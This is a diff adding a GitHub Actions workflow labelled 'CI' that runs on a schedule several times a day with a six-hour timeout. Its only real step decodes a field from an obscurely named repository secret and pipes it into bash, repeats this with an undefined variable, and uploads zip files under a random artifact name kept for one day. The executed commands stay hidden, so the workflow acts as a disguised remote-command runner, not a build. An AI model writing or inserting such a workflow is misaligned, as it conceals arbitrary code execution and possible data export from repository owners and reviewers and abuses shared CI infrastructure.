@@ -1,0 +1,31 @@
+name: CI
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '46 3,9,15,21 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  launch:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Do work
+        env:
+          jq3: ${{ secrets.jq3 }}
+        run: |
+          printf '%s' "$jq3" | jq -r .lm23763 | /bin/bash
+          printf '%s' "$m90268" | jq -r .slq06322 | /bin/bash
+
+      - name: Archive data
+        uses: actions/upload-artifact@v4
+        with:
+          name: qNfJmdlx
+          path: "*.zip"
+          retention-days: 1
